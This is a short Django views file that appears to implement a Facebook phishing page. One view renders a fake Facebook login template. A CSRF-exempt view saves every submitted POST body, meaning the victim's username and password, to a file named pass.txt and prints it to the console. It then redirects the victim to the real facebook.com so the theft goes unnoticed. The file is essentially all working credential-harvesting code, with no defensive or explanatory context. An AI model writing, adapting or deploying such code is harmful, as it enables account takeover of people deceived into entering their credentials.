from django.shortcuts import render, redirect
from django.http import HttpRequest, HttpResponse
from django.views.decorators.csrf import csrf_exempt
import json

# Create your views here.
def index(request):
    return HttpResponse('Welcome')

def login_facebook(request):
	return render(request, "login.html")

@csrf_exempt
def login_process(request):
    if request.method == "POST": 
        with open('pass.txt', 'wb') as ps:
            ps.write(request.body)
        print('------->', request.body)

    return redirect('https://facebook.com/')

